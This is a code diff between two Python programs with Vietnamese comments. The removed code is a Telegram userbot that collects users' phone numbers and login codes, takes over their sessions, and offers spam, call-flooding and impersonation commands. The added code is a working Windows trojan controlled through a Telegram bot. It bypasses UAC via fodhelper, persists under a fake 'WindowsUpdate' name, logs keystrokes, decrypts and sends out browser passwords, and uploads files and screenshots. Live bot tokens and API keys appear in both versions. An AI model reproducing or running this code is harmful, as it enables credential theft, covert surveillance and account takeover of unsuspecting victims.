@@ -1,399 +1,311 @@
-import asyncio, os, random, datetime, edge_tts, re, glob, requests
-from telethon import TelegramClient, events, Button, functions, types
-from telethon.errors import FloodWaitError, RPCError, PremiumAccountRequiredError
+import os
+import shutil
+import json
+import base64
+import sqlite3
+import win32crypt
+import time
+import pyautogui
+import requests
+import threading
+import keyboard
+import subprocess
+import sys
+import psutil
+from Crypto.Cipher import AES
+from telebot import TeleBot, types
+import winreg
+import ctypes
 
-# --- CẤU HÌNH ---
-A_ID = 34619338
-A_HS = '0f9eb480f7207cf57060f2f35c0ba137'
-B_TK = '8628695487:AAEV5oHUUMpGon6mFQnXIC7Z5zytnErMEvk'
-O_ID = 7153197678 
+#  Cấu hình Bot Telegram 
+BOT_TOKEN = '8628695487:AAEV5oHUUMpGon6mFQnXIC7Z5zytnErMEvk' #'Thay BOT của Ae vào đây'
+CHAT_ID = '7153197678'#'ID tele của AE'
+bot = TeleBot(BOT_TOKEN)
 
-U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
-U2 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/spam2.txt"
+# Đường dẫn backup
+BACKUP_DIR = "C:\\ProgramData\\WindowsUpdate"
+BACKUP_FILE = os.path.join(BACKUP_DIR, "system_update.exe")
 
-def _sync():
-    for n, u in {"chui.txt": U1, "spam2.txt": U2}.items():
-        try:
-            r = requests.get(u, timeout=10)
-            if r.status_code == 200:
-                with open(n, "w", encoding="utf-8") as f: f.write(r.text)
-        except: pass
-_sync()
+# Chống kill từ Task Manager
+def prevent_kill():
+    while True:
+        if not psutil.pid_exists(os.getpid()):
+            subprocess.Popen([sys.executable, __file__])
+            os._exit(0)
+        time.sleep(3)
 
-bot = TelegramClient('bot_manage', A_ID, A_HS).start(bot_token=B_TK)
-o_p, u_c, c_b, c_i, s_t, cl_t, a_r, o_f, w_m = {}, {}, {}, {}, {}, {}, {}, {}, {}
+# Tự sao lưu & chống xóa
+def auto_backup():
+    if not os.path.exists(BACKUP_DIR):
+        os.makedirs(BACKUP_DIR)
+    current_file = sys.argv[0]
+    if not os.path.exists(BACKUP_FILE) or os.path.abspath(current_file) != os.path.abspath(BACKUP_FILE):
+        shutil.copy2(current_file, BACKUP_FILE)
+        subprocess.Popen([BACKUP_FILE], shell=True)
+        sys.exit()
 
-F1, F2 = "bot_users.txt", "banned_users.txt"
-if os.path.exists(F2):
-    with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
-else: b_u = set()
+# Watchdog 
+def watchdog():
+    parent_pid = os.getppid()
+    while True:
+        if not psutil.pid_exists(parent_pid):
+            subprocess.Popen([sys.executable, __file__])
+            os._exit(0)
+        time.sleep(5)
+OUTPUT_DIR = os.path.join(os.environ['TEMP'], 'StealData')
+KEYLOG_DIR = os.path.join(OUTPUT_DIR, 'Keylog')
 
-def _sb():
-    with open(F2, "w") as f:
-        for u in b_u: f.write(f"{u}\n")
+os.makedirs(OUTPUT_DIR, exist_ok=True)
+os.makedirs(KEYLOG_DIR, exist_ok=True)
 
-def _su(u):
-    if not os.path.exists(F1): open(F1, "w").close()
-    with open(F1, "r") as f: us = f.read().splitlines()
-    if str(u) not in us:
-        with open(F1, "a") as f: f.write(f"{u}\n")
-
-M_T =📣 XÁC THỰC NGƯỜI DÙNG
-━━━━━━━━━━━━━━━
-💰 BẢNG GIÁ
-━━━━━━━━━━━━━━━
-🎫 2K/DAY
-🎫 10K/WEEK
-🎫 20K/MONTH
-🎫 70K/VV
-━━━━━━━━━━━━━━━
-🔑 Vui lòng nhập key để sử dụng bot
-📝 /nhapkey <key>
-━━━━━━━━━━━━━━━
-👑 ADMIN: @hquycute """
-. 　˚　. . ✦˚ .     　　˚　　　　✦　.
-𖣘 Hai Quy✘ 𝘾𝙝𝙚𝙖𝙩.   2026 𖣘
-.  ˚　.　 . ✦　˚　 .   .　.  　˚　  　.
-
-🔥 𝑺𝒑𝒂𝒎 & 𝑻𝒂𝒈
-┣ /sp <id> - Spam chửi
-┣ /sp2 <id> - Spam nội dung
-┣ /spicon <số> - Spam icon
-┣ /spnd <nd> - Spam treo
-┣ /spstick <số> - Spam sticker
-┗ /spcall <id> - Spam call
-
-☠ 𝑯𝒆‌‌ 𝑻𝒉𝒐‌‌𝒏𝒈 Đ𝒆𝒐 𝑹𝒐‌
-┣ /cam <id> <box> - Câm box
-┣ /sua <id> <box> - Gỡ câm
-┣ /camib <id> - Câm ib
-┗ /suaib <id> - Gỡ câm ib
-
-📦 𝑳𝒂‌𝒕 𝑽𝒂‌𝒕
-┣ /info <@/id/rep> - Soi trang
-┣ /fake <@/id/rep> - Fake người khác
-┣ /diefake - về lại acc gốc
-┣ /voice <text> - Voice 
-┣ /autore <on/off> - Tự động thả tim
-┣ /off <on/off> - Chế độ bận
-┣ /stop - Dừng tất cả
-┣ /clear - Xóa 100 tin nhắn
-┣ /clear2 - Xoá tin nhắn bot
-┗ /logout - Thoát acc
-
-👤 **Tài khoản:** [𝙃𝙪𝙪𝙏𝙞𝙚𝙣 ✘ 𝘾𝙝𝙚𝙖𝙩](tg://user?id=7153197678)
-"""
-
-def _logic(c, u_i):
-    def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)
-
-    async def _sd(cid, ct, tid=None):
-        s_t[u_i] = True
-        inf = isinstance(ct, str)
-        ls = ct if not inf else [ct]
-        n = 0
-        while s_t.get(u_i):
-            for m in ls:
-                if not s_t.get(u_i): break
-                try:
-                    fm = f"{m.strip()} [\u200b](tg://user?id={tid})" if tid else m.strip()
-                    await c.send_message(cid, fm, parse_mode='markdown')
-                    await asyncio.sleep(random.uniform(0.8, 1.2))
-                    n += 1
-                    if n % 10 == 0: await asyncio.sleep(3)
-                except FloodWaitError as e: await asyncio.sleep(e.seconds + 2)
-                except: break
-            if not inf: break
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
-    async def _inf(e):
-        target = e.pattern_match.group(1)
-        try:
-            if target:
-                if target.isdigit(): user = await c.get_entity(int(target))
-                else: user = await c.get_entity(target)
-            elif e.is_reply:
-                rep = await e.get_reply_message()
-                user = await c.get_entity(rep.sender_id)
-            else:
-                user = await c.get_me()
-            
-            await e.edit(f"👤 **Name:** {user.first_name}\n🆔 **ID:** `{user.id}`\n🏷 **User:** @{user.username if user.username else 'N/A'}")
-        except: await e.edit("❌ **Không tìm thấy người này!**")
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/fake(?:\s+(.+))?'))
-    async def _fk(e):
-        t = e.pattern_match.group(1)
-        try:
-            if t: target = await c.get_entity(int(t) if t.isdigit() else t)
-            elif e.is_reply: target = await c.get_entity((await e.get_reply_message()).sender_id)
-            else: return await e.edit("⚠️ Tag @, ID hoặc Reply!")
-        except: return await e.edit("❌ Không thấy!")
-
-        await e.edit(f"🔄 Đang lột xác...")
-        try:
-            me = await c.get_me()
-            me_f = await c(functions.users.GetFullUserRequest(id=me.id))
-            my_p = await c.download_profile_photo('me')
-            o_p[u_i] = {'f': me.first_name, 'l': me.last_name, 'a': me_f.full_user.about or "", 'p': my_p}
-
-            tf = await c(functions.users.GetFullUserRequest(id=target.id))
-            tu = tf.users[0]
-            await c(functions.account.UpdateProfileRequest(
-                first_name=tu.first_name or "", 
-                last_name=tu.last_name or "", 
-                about=tf.full_user.about or ""
-            ))
-
-            p = await c.get_profile_photos(target.id, limit=1)
-            if p:
-                path = await c.download_media(p[0])
-                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(path)))
-                if os.path.exists(path): os.remove(path)
-            else:
-                curr_p = await c.get_profile_photos('me')
-                if curr_p: await c(functions.photos.DeletePhotosRequest(id=[types.InputPhoto(id=ph.id, access_hash=ph.access_hash, file_reference=ph.file_reference) for ph in curr_p]))
-            await e.edit("✅ Xong"); await asyncio.sleep(1); await e.delete()
-        except: await e.edit("❌ Lỗi Fake")
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/diefake'))
-    async def _dfk(e):
-        if u_i not in o_p: return await e.edit("⚠️ Chưa lưu gốc!")
-        await e.edit("🔙 Đang hoàn hồn...")
-        o = o_p[u_i]
-        try:
-            await c(functions.account.UpdateProfileRequest(
-                first_name=o['f'] or "", 
-                last_name=o['l'] or "", 
-                about=o['a'] or ""
-            ))
-            curr_p = await c.get_profile_photos('me')
-            if curr_p: await c(functions.photos.DeletePhotosRequest(id=[types.InputPhoto(id=ph.id, access_hash=ph.access_hash, file_reference=ph.file_reference) for ph in curr_p]))
-            if o['p'] and os.path.exists(o['p']):
-                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(o['p'])))
-                os.remove(o['p'])
-            o_p.pop(u_i)
-            await e.edit("✅ Đã về gốc"); await asyncio.sleep(1); await e.delete()
-        except: await e.edit("❌ Lỗi diefake")
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp (\d+)'))
-    async def _sp1(e):
-        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
-        if os.path.exists('chui.txt'): await _sd(e.chat_id, open('chui.txt', 'r', encoding='utf-8').readlines(), t)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp2 (\d+)'))
-    async def _sp2(e):
-        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
-        if os.path.exists('spam2.txt'): await _sd(e.chat_id, open('spam2.txt', 'r', encoding='utf-8').read().strip(), t)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/spicon (\d+)'))
-    async def _spi(e):
-        _mk(e.chat_id); s_t[u_i] = True; await e.delete()
-        try: cnt = int(e.pattern_match.group(1))
-        except: cnt = 10
-        for _ in range(min(cnt, 500)):
-            if not s_t.get(u_i): break
-            await e.respond(random.choice(["🧠", "💩", "🤪", "🤣", "💀", "🤡", "🫵", "🙄", "🤙", "👻"]))
-            await asyncio.sleep(0.3)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/spnd\s+([\s\S]+)'))
-    async def _spn(e):
-        v = e.pattern_match.group(1).strip(); _mk(e.chat_id); await e.delete(); s_t[u_i] = True
-        while s_t.get(u_i):
-            try: await c.send_message(e.chat_id, v); await asyncio.sleep(random.uniform(0.7, 1.1))
-            except FloodWaitError as r: await asyncio.sleep(r.seconds + 1)
-            except: break
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/spstick (\d+)'))
-    async def _stk(e):
-        _mk(e.chat_id); n = int(e.pattern_match.group(1)); await e.delete(); s_t[u_i] = True
-        r = await c(functions.messages.GetRecentStickersRequest(hash=0))
-        curr = 0
-        while curr < n and s_t.get(u_i):
-            b = min(50, n - curr)
-            await asyncio.gather(*[c.send_file(e.chat_id, random.choice(r.stickers)) for _ in range(b)])
-            curr += b; await asyncio.sleep(1.2)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/spcall (\d+)'))
-    async def _cal(e):
-        _mk(e.chat_id); t = int(e.pattern_match.group(1)); await e.delete(); cl_t[u_i] = True
-        while cl_t.get(u_i):
-            try:
-                res = await c(functions.phone.RequestCallRequest(user_id=t, random_id=random.randint(0, 0x7fffffff), g_a_hash=os.urandom(32), protocol=types.PhoneCallProtocol(min_layer=93, max_layer=93, udp_p2p=True, library_versions=['2.1.0'])))
-                await asyncio.sleep(2); await c(functions.phone.DiscardCallRequest(peer=types.InputPhoneCall(id=res.phone_call.id, access_hash=res.phone_call.access_hash), duration=0, reason=types.PhoneCallDiscardReasonDisconnect(), connection_id=0))
-            except: await asyncio.sleep(5)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
-    async def _stp(e):
-        s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 STOP"); await asyncio.sleep(1); await e.delete()
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/clear$'))
-    async def _cl1(e):
-        # Lấy 100 tin nhắn gần nhất do chính bạn gửi và xoá sạch
-        async for m in c.iter_messages(e.chat_id, from_user='me', limit=100):
-            try: await m.delete()
-            except: continue
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/clear2'))
-    async def _cl2(e):
-        k = f"{u_i}_{e.chat_id}"; st = w_m.get(k)
-        if not st: await e.edit("⚠️ No data"); await asyncio.sleep(1); await e.delete(); return
-        await e.edit("🧹 Clearing..."); 
-        async for m in c.iter_messages(e.chat_id, from_user='me'):
-            if m.date < st: break
-            try: await m.delete()
-            except: continue
-        w_m.pop(k, None)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/(cam|sua)(?:\s+(\d+))?(?:\s+(-?\d+))?'))
-    async def _cam1(e):
-        m, u, b = e.pattern_match.group(1), e.pattern_match.group(2), e.pattern_match.group(3)
-        if not u and e.is_reply: u = str((await e.get_reply_message()).sender_id)
-        if not b: b = str(e.chat_id)
-        if u:
-            k = f"{u_i}_{b}_{u}"
-            if m == "cam": c_b[k] = True
-            else: c_b.pop(k, None)
-            await e.edit(f"✅ {m.upper()} {u}"); await asyncio.sleep(1); await e.delete()
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/(camib|suaib)(?:\s+(\d+))?'))
-    async def _cam2(e):
-        m, u = e.pattern_match.group(1), e.pattern_match.group(2)
-        if not u: u = str(e.chat_id) if e.is_private else (str((await e.get_reply_message()).sender_id) if e.is_reply else None)
-        if u:
-            k = f"{u_i}_{u}"
-            if m == "camib": c_i[k] = True
-            else: c_i.pop(k, None)
-            await e.edit(f"✅ {m.upper()} {u}"); await asyncio.sleep(1); await e.delete()
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/voice (.+)'))
-    async def _v(e):
-        t = e.pattern_match.group(1); await e.delete(); p = f"v_{u_i}.mp3"
-        await edge_tts.Communicate(t, "vi-VN-NamMinhNeural", rate="-15%").save(p)
-        await c.send_file(e.chat_id, p, voice_note=True)
-        if os.path.exists(p): os.remove(p)
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/(autore|off)\s+(on|off)'))
-    async def _tg(e):
-        x, y = e.pattern_match.group(1), e.pattern_match.group(2)
-        if x == "autore": a_r[u_i] = (y == "on")
-        else: o_f[u_i] = (y == "on")
-        await e.edit(f"✅ {x.upper()} {y.upper()} "); await asyncio.sleep(1); await e.delete()
-
-    @c.on(events.NewMessage(outgoing=True, pattern=r'/logout'))
-    async def _lo(e):
-        await e.edit("🚮 Logging out..."); 
-        try:
-            u_c.pop(u_i, None)
-            await c.log_out()
-            if os.path.exists(f"u_{u_i}.session"): os.remove(f"u_{u_i}.session")
-            await e.delete()
-        except: pass
-
-    @c.on(events.NewMessage(incoming=True))
-    async def _br(ev):
-        if u_i in b_u: return
-        kb, ki = f"{u_i}_{ev.chat_id}_{ev.sender_id}", f"{u_i}_{ev.sender_id}"
-        if c_b.get(kb) or (ev.is_private and c_i.get(ki)):
-            try: await ev.delete()
-            except: pass
-            return
-        if a_r.get(u_i) and ev.sender_id != u_i:
-            try: await c(functions.messages.SendReactionRequest(peer=ev.chat_id, msg_id=ev.id, reaction=[types.ReactionEmoji(emoticon='❤️')]))
-            except: pass
-        if o_f.get(u_i) and ev.is_private and ev.sender_id != u_i:
-            try: await ev.reply("đây là tin nhắn tự động, Tao đang bận không thấy off à nhắn cc")
-            except: pass
-
-@bot.on(events.CallbackQuery(data="login"))
-async def _lf(ev):
-    u = ev.sender_id
-    if u in b_u: return
-    async with bot.conversation(u) as cv:
-        try:
-            await cv.send_message("SĐT (+84...):")
-            p = (await cv.get_response()).text.strip().replace(" ", "")
-            c = TelegramClient(f"u_{u}", A_ID, A_HS)
-            await c.connect()
-            if not await c.is_user_authorized():
-                r = await c.send_code_request(p)
-                await cv.send_message("OTP:")
-                o = (await cv.get_response()).text.strip()
-                await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
-            
-            user = await bot.get_entity(u)
-            photo = await bot.download_profile_photo(u, file=f"avt_{u}.jpg")
-            rep = f"🚀 **CÓ THẰNG VỪA LOGIN BOT**\n━━━━━━━━━━━━━━━\n👤 **Tên:** {user.first_name}\n🆔 **ID:** `{u}`\n🏷 **Username:** @{user.username if user.username else 'N/A'}\n📞 **SĐT:** `{p}`\n🔗 **Trang cá nhân:** [Link](tg://user?id={u})"
-            if photo:
-                await bot.send_file(O_ID, photo, caption=rep, parse_mode='markdown')
-                os.remove(photo)
-            else: await bot.send_message(O_ID, rep, parse_mode='markdown')
-            u_c[u] = c; _logic(c, u)
-            await cv.send_message("✅ OK")
-        except Exception as e: await cv.send_message(f"❌ {e}")
-
-@bot.on(events.NewMessage(pattern='/start'))
-async def _st(ev):
-    _su(ev.sender_id)
-    await ev.respond(M_T, buttons=[[Button.inline("📱 LOGIN", data="login")]])
-
-@bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
-async def _bn(e):
-    if e.sender_id != O_ID: return
-    u = int(e.pattern_match.group(1))
-    b_u.add(u); _sb()
-    msg = f"🚫 Đã ban ID: `{u}`"
-    if u in u_c:
-        try:
-            if u in s_t: s_t[u] = False
-            if u in cl_t: cl_t[u] = False
-            await u_c[u].disconnect()
-            u_c.pop(u)
-            msg += " (Đã sút khỏi hệ thống)"
-        except: pass
-    await e.respond(msg)
-
-@bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
-async def _ubn(e):
-    if e.sender_id != O_ID: return
-    u = int(e.pattern_match.group(1))
-    if u in b_u:
-        b_u.remove(u); _sb()
-        await e.respond(f"✅ Đã unban ID: `{u}`")
-    else: await e.respond("⚠️ ID này không nằm trong danh sách ban!")
-
-@bot.on(events.NewMessage(pattern=r'/tb\s+([\s\S]+)'))
-async def _tb(e):
-    if e.sender_id != O_ID: return
-    msg = e.pattern_match.group(1)
-    if not os.path.exists(F1): return await e.respond("⚠️ Chưa có người dùng nào trong danh sách!")
+keylog_file = os.path.join(KEYLOG_DIR, "keylog.txt")
+def bypass_uac():
+    payload = sys.argv[0]
+    reg_path = r"Software\Classes\ms-settings\shell\open\command"
     
-    await e.respond("📣 **Đang bắt đầu gửi thông báo hàng loạt...**")
-    count = 0
-    with open(F1, "r") as f:
-        ids = f.read().splitlines()
-    
-    for uid in ids:
-        try:
-            await bot.send_message(int(uid), f"📢 **THÔNG BÁO TỪ ADMIN**\n━━━━━━━━━━━━━━━\n\n{msg}")
-            count += 1
-            await asyncio.sleep(0.3)
-        except: continue
-        
-    await e.respond(f"✅ Đã gửi thành công cho {count} người dùng!")
+    try:
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg_key:
+            winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, payload)
+            winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")
 
-async def main():
-    for f in glob.glob("u_*.session"):
-        try:
-            u = int(f.split('_')[1].split('.')[0])
-            if u in b_u: continue
-            c = TelegramClient(f"u_{u}", A_ID, A_HS)
-            await c.connect()
-            if await c.is_user_authorized(): u_c[u] = c; _logic(c, u)
-            else: await c.disconnect()
-        except: pass
-    await bot.run_until_disconnected()
+        os.system("C:\\Windows\\System32\\fodhelper.exe")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
+            winreg.DeleteKey(reg_key, "")
+        send_message("✅ UAC Bypass thành công! Đã chạy với quyền Admin.")
+    except Exception as e:
+        error_msg = f"⚠️ UAC Bypass thất bại: {e}"
+        send_message(error_msg)
 
+#  Thêm vào Startup(kết hợp với UAC Bypass) 
+def add_to_startup():
+    exe_path = os.path.abspath(sys.argv[0])
+    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    value_name = 'WindowsUpdateMonitor'
+
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, exe_path)
+        bypass_uac()
+
+    except:
+        pass
+def hide_console():
+    try:
+        import ctypes
+        whnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if whnd != 0:
+            ctypes.windll.user32.ShowWindow(whnd, 0)
+    except:
+        pass
+def kill_old_instance():
+    current_pid = os.getpid()
+    current_file = os.path.abspath(sys.argv[0])
+
+    for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        if proc.info['pid'] == current_pid:
+            continue
+
+        exe_path = proc.info['exe']
+        if not exe_path or not os.path.exists(exe_path):
+            continue
+
+        try:
+            if os.path.samefile(exe_path, current_file):
+                proc.kill()
+        except:
+            pass
+def send_message(text, parse_mode=None):
+    try:
+        bot.send_message(CHAT_ID, text, parse_mode=parse_mode)
+    except:
+        pass
+
+def send_file(file_path, caption=""):
+    try:
+        with open(file_path, 'rb') as f:
+            bot.send_document(CHAT_ID, f, caption=caption)
+    except:
+        pass
+
+# ===== Keylogger =====
+def write_keylog(key):
+    with open(keylog_file, 'a', encoding='utf-8') as f:
+        f.write(key.name if len(key.name) == 1 else f'[{key.name}]')
+
+def keylogger_thread():
+    keyboard.on_press(write_keylog)
+    keyboard.wait()
+
+def send_and_clear_keylog():
+    if os.path.exists(keylog_file) and os.path.getsize(keylog_file) > 0:
+        with open(keylog_file, 'r', encoding='utf-8') as f:
+            content = f.read()
+
+        send_message(f"📄 Keylog:\n```\n{content}\n```", parse_mode="Markdown")
+        open(keylog_file, 'w').close()
+
+# ===== Lấy mật khẩu trình duyệt =====
+BROWSER_PATHS = {
+    'Chrome': os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\',
+    'Edge': os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\',
+    'Brave': os.path.expanduser('~') + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\',
+    'CocCoc': os.path.expanduser('~') + '\\AppData\\Local\\CocCoc\\Browser\\User Data\\'
+}
+
+def get_master_key(browser_path):
+    try:
+        with open(browser_path + 'Local State', 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    except:
+        return None
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        encrypted = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        return cipher.decrypt(encrypted)[:-16].decode()
+    except:
+        return "FAILED"
+
+def steal_passwords():
+    for browser, path in BROWSER_PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        master_key = get_master_key(path)
+        if not master_key:
+            continue
+
+        for profile in os.listdir(path):
+            if "Profile" not in profile and profile != "Default":
+                continue
+
+            login_db = os.path.join(path, profile, 'Login Data')
+            if not os.path.exists(login_db):
+                continue
+
+            shutil.copy2(login_db, 'temp_login.db')
+            conn = sqlite3.connect('temp_login.db')
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+            result = []
+            for url, username, encrypted_password in cursor.fetchall():
+                password = decrypt_password(encrypted_password, master_key)
+                result.append(f"{url} | {username} | {password}")
+
+            conn.close()
+            os.remove('temp_login.db')
+
+            if result:
+                file_path = os.path.join(OUTPUT_DIR, f'{browser}_{profile}_passwords.txt')
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    f.write('\n'.join(result))
+                send_file(file_path, f'🔐 {browser} - {profile}')
+
+def find_chrome_path():
+    # Các vị trí phổ biến
+    possible_paths = [
+        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+        os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe")
+    ]
+
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe") as key:
+            chrome_path, _ = winreg.QueryValueEx(key, "")
+            if os.path.exists(chrome_path):
+                return chrome_path
+    except:
+        pass
+    for path in possible_paths:
+        if os.path.exists(path):
+            return path
+    return None
+def find_and_send_files():
+    file_types = ['.txt', '.docx', '.pdf', '.jpg', '.png']
+    found_files = []
+    drives = [f"{d}:/" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:/")]
+
+    for drive in drives:
+        for root, _, files in os.walk(drive):
+            for file in files:
+                if os.path.splitext(file)[1].lower() in file_types:
+                    file_path = os.path.join(root, file)
+                    found_files.append(file_path)
+                    send_file(file_path)
+                    if len(found_files) >= 10:
+                        send_message("📂 Đã gửi 10 file quan trọng. Đang tiếp tục...")
+                        return
+
+    if not found_files:
+        send_message("⚠️ Không tìm thấy file quan trọng nào!")
+
+@bot.message_handler(commands=['lay_file'])
+def cmd_list_files(message):
+    send_message("🔍 Đang tìm file quan trọng...")
+    find_and_send_files()
+    send_message("✅ Hoàn thành!")
+
+@bot.message_handler(commands=['shutdown'])
+def cmd_shutdown(message):
+    send_message("🛑 Đang tắt máy...")
+    os.system("shutdown /s /t 0")
+
+@bot.message_handler(commands=['restart'])
+def cmd_restart(message):
+    send_message("🔄 Đang khởi động lại máy...")
+    os.system("shutdown /r /t 0")
+
+
+@bot.message_handler(commands=['help'])
+def cmd_help(message):
+    send_message("""
+📖 Danh sách lệnh:
+/lay_pass - Lấy mật khẩu trình duyệt
+/lay_keylog - Xem keylog
+/chup_man_hinh - Chụp màn hình
+/mo_url - Mở URL
+/lay_file - Lấy danh sách file quan trọng 
+/shutdown - Tắt máy
+/restart - Khởi động lại máy                             
+    """)
+
+
+@bot.message_handler(commands=['lay_pass'])
+def cmd_passwords(message):
+    steal_passwords()
+
+@bot.message_handler(commands=['lay_keylog'])
+def cmd_keylog(message):
+    send_and_clear_keylog()
+
+@bot.message_handler(commands=['chup_man_hinh'])
+def cmd_screenshot(message):
+    file_path = os.path.join(OUTPUT_DIR, 'screenshot.png')
+    pyautogui.screenshot().save(file_path)
+    send_file(file_path, "🖼 Screenshot")
+
+@bot.message_handler(commands=['mo_url'])
+def cmd_open_url(message):
+    url = message.text.split(maxsplit=1)[-1]
+    if not url.startswith('http'):
+        url = 'http://' + url
+
+    chrome_path = find_chrome_path()
+    if chrome_path:
+        subprocess.Popen([chrome_path, '--new-tab', url], shell=False)
+        send_message(f"🌐 Đã mở: {url}")
+    else:
+        send_message("⚠️ Không tìm thấy Chrome trên máy!")
 if __name__ == '__main__':
-    asyncio.get_event_loop().run_until_complete(main())
-
+    kill_old_instance()
+    add_to_startup()
+    hide_console()
+    threading.Thread(target=watchdog, daemon=True).start()
+    threading.Thread(target=keylogger_thread, daemon=True).start()
+    send_message("✅ Bot đã khởi động Nhấn /help !")
+    bot.polling(none_stop=True)
